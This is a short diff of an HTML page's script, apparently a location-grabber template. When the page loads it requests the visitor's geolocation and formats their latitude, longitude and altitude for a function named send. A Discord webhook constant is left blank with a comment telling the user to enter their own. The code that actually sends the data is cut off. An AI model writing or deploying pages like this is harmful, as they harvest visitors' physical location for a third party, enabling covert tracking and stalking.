@@ -3,15 +3,15 @@
 <head>
 <meta charset="utf-8">
 <script>
-function test() {
-    navigator.geolocation.getCurrentPosition(test2);
-}
-window.onload = function() {
-    test()
-}
-const webhook = ""
-function test2(position) {
 
+window.onload = function() {
+    main()
+}
+const webhook = ""  //ここにdiscordのwebhookを入力して！Enter the discord webhook here!
+function main() {
+    navigator.geolocation.getCurrentPosition(send);
+}
+function send(position) {
     var geo_text = "緯度:" + position.coords.latitude + "\n";
     geo_text += "経度:" + position.coords.longitude + "\n";
     geo_text += "高度:" + position.coords.altitude + "\n";
